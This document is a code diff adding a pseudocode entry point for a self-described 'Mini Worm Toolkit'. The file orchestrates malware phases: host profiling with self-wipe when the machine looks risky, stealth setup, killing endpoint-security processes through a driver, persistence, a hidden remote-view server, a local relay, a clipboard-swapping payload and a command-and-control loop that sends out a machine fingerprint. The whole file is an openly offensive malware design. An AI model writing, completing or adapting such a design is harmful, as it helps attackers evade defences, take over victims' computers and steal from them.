@@ -1,0 +1,64 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/entry.pseudo
+# Veneficus Mini — process entry. Orchestrator only.
+
+IMPORTS:
+    channel_crypto, control, driver_assist, payload,
+    stealth, stay, local_relay, retire, host_profile,
+    hidden_view, coerce   # coerce is present but NEVER called
+
+GLOBAL:
+    SAFE = atomic boolean, default false
+
+FUNCTION start():
+    IF debug_build: enable local logging ELSE stay silent
+
+    agent_id = AGENT_ID          # baked at compile time
+
+    # Phase 1 — host profile
+    (score, reasons) = host_profile.score_machine()
+    IF score > HIGH:
+        retire.wipe_and_exit(forced=true)
+        RETURN
+    ELSE IF score > MEDIUM:
+        SAFE = true
+    ELSE:
+        full operation
+
+    # Phase 2 — concealment + defender neutralization
+    IF not SAFE:
+        IF stealth.bring_up() fails: RETURN
+        IF feature driver_assist:
+            names = catalog of common endpoint-security process names
+            pids  = host_profile.pids_named(names)
+            IF pids not empty:
+                driver_assist.terminate_by_pool(pids)
+    ELSE:
+        skip concealment
+
+    # Phase 3 — background work
+    handles = []
+    IF not SAFE:
+        handles += thread { payload.init(); payload.run() }
+        stay.install()   # failure is non-fatal
+        handles += thread { local_relay.listen(LOCAL_RELAY_BIND) }
+        handles += thread { hidden_view.Server(VIEW_PORT).serve() }
+        handles += thread { payload.paste_swap.Session().run() }
+    ELSE:
+        handles += thread {
+            fp = payload.machine_card()
+            control.post("card", json(fp))
+        }
+
+    # Phase 4 — control loop (does not return)
+    control.spin()
+
+    # Phase 5 — written but unreachable: spin() is diverging
+    payload.paste_swap.stop()
+    join all handles
+    retire.wipe_and_exit(forced=false)
